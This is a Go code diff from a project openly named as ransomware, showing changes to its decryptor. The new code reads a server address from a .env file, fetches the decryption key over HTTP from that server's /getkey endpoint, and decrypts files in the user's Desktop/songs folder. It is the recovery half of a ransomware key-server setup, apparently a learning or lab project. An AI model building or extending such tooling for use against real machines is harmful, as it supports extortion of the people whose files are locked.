@@ -9,11 +9,14 @@ package main
 
 import (
 	"fmt"
+	"io"
+	"net/http"
 	"os"
 	"path/filepath"
 	"runtime"
 
 	"github.com/common-nighthawk/go-figure"
+	"github.com/joho/godotenv"
 	"ransomware.com/main/internal/colors"
 	"ransomware.com/main/internal/decryptor"
 )
@@ -34,7 +37,28 @@ func main() {
 		fmt.Println("Windows is required to run this decryptor. Exiting...")
 		return
 	}
-	key := make([]byte, 32)
-	fmt.Println("Key: ", key)
-	decryptor.ExecuteDecrypt(filepath.Join(os.Getenv("USERPROFILE")), key)
+
+	err := godotenv.Load()
+	if err != nil {
+		fmt.Println("Error loading .env file:", err)
+		return
+	}
+
+	ipaddr := os.Getenv("IP_ADDRESS")
+	port := os.Getenv("PORT")
+
+	resp, err := http.Get("http://" + ipaddr + ":" + port + "/getkey")
+	if err != nil {
+		fmt.Println("Error getting key:", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	key, err := io.ReadAll(resp.Body)
+	if err != nil {
+		fmt.Println("Error reading key:", err)
+		return
+	}
+
+	decryptor.ExecuteDecrypt(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//songs"), key)
 }
